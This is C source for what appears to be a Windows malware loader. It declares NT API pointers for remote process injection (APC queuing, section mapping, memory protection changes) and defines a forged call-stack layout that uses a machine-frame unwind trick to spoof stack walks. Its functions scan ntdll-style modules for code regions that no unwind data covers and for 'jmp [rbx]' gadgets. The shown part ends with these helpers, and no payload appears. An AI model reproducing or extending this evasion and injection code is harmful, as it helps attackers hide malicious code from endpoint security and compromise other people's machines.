#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "loader.h"

typedef struct { HANDLE UniqueProcess; HANDLE UniqueThread; } CID;

typedef NTSTATUS (NTAPI *PNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, CID *);
typedef NTSTATUS (NTAPI *PNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *PNtClose)(HANDLE);
typedef NTSTATUS (NTAPI *PNtOpenThread)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, CID *);
typedef NTSTATUS (NTAPI *PNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);
typedef NTSTATUS (NTAPI *PNtAlertThread)(HANDLE);
typedef NTSTATUS (NTAPI *PNtCreateSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *PNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
typedef NTSTATUS (NTAPI *PNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *PNtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

typedef PRUNTIME_FUNCTION (NTAPI *PRtlLFE)(DWORD64, PDWORD64, PUNWIND_HISTORY_TABLE);
typedef VOID (NTAPI *PRtlVU)(DWORD, DWORD64, DWORD64, PRUNTIME_FUNCTION,
                              PCONTEXT, PVOID *, PDWORD64, PVOID);

static PNtDelayExecution _NtDelay;

#define NT_OK(s)     ((NTSTATUS)(s) >= 0)
#define ViewUnmap    2

#ifndef THREAD_ALERT
#define THREAD_ALERT 0x0004
#endif

static const uint8_t WIN32U_NOP8[] = {0x0F,0x1F,0x84,0x00,0x00,0x00,0x00,0x00};

typedef struct { DWORD Begin, End, Unwind; } RF;
typedef struct { BYTE VF; BYTE Prolog; BYTE Count; BYTE Frame; } UH;
typedef struct { BYTE Off; BYTE Op; } UC;

#define UWOP_PUSH_MACHFRAME 10

/* ghost region — executable code not covered by any RUNTIME_FUNCTION */
typedef struct {
    ULONG64 va_start, va_end;
    UINT    size;
    ULONG64 export_va;
    UINT    dist;
    char    name[64];
} Ghost;

/* hardware exception frame used by the BYOUD-MF primitive */
#pragma pack(push, 1)
typedef struct {
    ULONG64 Rip;
    ULONG64 Cs;
    ULONG64 EFlags;
    ULONG64 Rsp;
    ULONG64 Ss;
} MachFrame;
#pragma pack(pop)

/*
 * fake stack layout (low → high, stack grows down):
 *   L5_thread_root   ← walked last
 *   L4_win32u
 *   L3_ntdll
 *   L2_kbase
 *   L1_wow64         ← g_chain_rsp points here
 *   MachFrame (40 B) ← consumed by UWOP_PUSH_MACHFRAME handler
 *   mf_trigger       ← KiUserExceptionDispatcher+4
 */
typedef struct {
    ULONG64   L5_thread_root;
    ULONG64   L4_win32u;
    ULONG64   L3_ntdll;
    ULONG64   L2_kbase;
    ULONG64   L1_wow64;
    MachFrame mf;
    ULONG64   mf_trigger;
} LacunaStack;


static bool pe_section(HMODULE mod, const char *sname, ULONG64 *va, ULONG *sz)
{
    uint8_t *b = (uint8_t *)mod;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(b + ((PIMAGE_DOS_HEADER)b)->e_lfanew);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (strncmp((char *)s->Name, sname, 8) == 0) {
            *va = (ULONG64)b + s->VirtualAddress;
            *sz = s->Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

static ULONG64 pe_export(HMODULE mod, const char *fname)
{
    uint8_t *b = (uint8_t *)mod;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(b + ((PIMAGE_DOS_HEADER)b)->e_lfanew);
    DWORD erva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!erva) return 0;
    PIMAGE_EXPORT_DIRECTORY ed = (PIMAGE_EXPORT_DIRECTORY)(b + erva);
    DWORD *names = (DWORD *)(b + ed->AddressOfNames);
    WORD  *ords  = (WORD  *)(b + ed->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(b + ed->AddressOfFunctions);
    for (DWORD i = 0; i < ed->NumberOfNames; i++)
        if (!strcmp((char *)(b + names[i]), fname))
            return (ULONG64)b + funcs[ords[i]];
    return 0;
}


static int scan_ghosts(HMODULE mod, const char **targets, int nt, Ghost *out, int max)
{
    ULONG64 pva; ULONG psz;
    if (!pe_section(mod, ".pdata", &pva, &psz)) return 0;

    ULONG64 tva[32] = {0}; char tname[32][64]; int n_t = 0;
    for (int i = 0; i < nt && n_t < 32; i++) {
        ULONG64 v = pe_export(mod, targets[i]);
        if (v) { tva[n_t] = v; strncpy(tname[n_t], targets[i], 63); n_t++; }
    }

    RF *rf = (RF *)pva;
    int count = psz / sizeof(RF);
    ULONG64 img = (ULONG64)mod, prev = 0;
    int found = 0;

    for (int i = 0; i < count && found < max; i++) {
        if (!rf[i].Unwind) continue;
        ULONG64 begin = img + rf[i].Begin;
        ULONG64 end   = img + rf[i].End;
        if (prev && begin > prev) {
            UINT sz = (UINT)(begin - prev);
            uint8_t *gp = (uint8_t *)prev;
            int nonpad = 0;
            for (UINT k = 0; k < sz && k < 512; k++)
                if (gp[k] != 0xCC && gp[k] != 0x00 && gp[k] != 0x90) nonpad++;
            if (nonpad > 4 && sz >= 8) {
                UINT best = 0xFFFFFFFF; int bi = -1;
                for (int j = 0; j < n_t; j++) {
                    UINT d = (tva[j] >= prev && tva[j] <= prev + sz) ? 0
                           : (tva[j] > prev + sz) ? (UINT)(tva[j] - (prev + sz))
                                                   : (UINT)(prev - tva[j]);
                    if (d < best) { best = d; bi = j; }
                }
                out[found].va_start  = prev;
                out[found].va_end    = prev + sz;
                out[found].size      = sz;
                out[found].export_va = bi >= 0 ? tva[bi] : 0;
                out[found].dist      = best;
                if (bi >= 0) strncpy(out[found].name, tname[bi], 63);
                found++;
            }
        }
        prev = end;
    }
    return found;
}

static Ghost *best_ghost(Ghost *g, int n, const char *target)
{
    Ghost *best = NULL; UINT bd = 0xFFFFFFFF;
    for (int i = 0; i < n; i++)
        if (!strcmp(g[i].name, target) && g[i].dist < bd)
            { bd = g[i].dist; best = &g[i]; }
    return best;
}

typedef struct {
    ULONG64 va;
    char    parent[64];
} GhostGadget;

static int scan_ghost_gadgets(Ghost *ghosts, int n, const char *mod,
                              GhostGadget *out, int max)
{
    int found = 0;
    for (int i = 0; i < n && found < max; i++) {
        uint8_t *p = (uint8_t *)ghosts[i].va_start;
        UINT sz = ghosts[i].size;
        for (UINT k = 0; k + 1 < sz; k++) {
            if (p[k] == 0xFF && p[k+1] == 0x23) {  /* jmp [rbx] */
                out[found].va = ghosts[i].va_start + k;
                snprintf(out[found].parent, 63, "%s ghost @%llx",
                         mod, ghosts[i].va_start);
                found++;
                if (found >= max) break;
            }
        }
    }
    return found;
}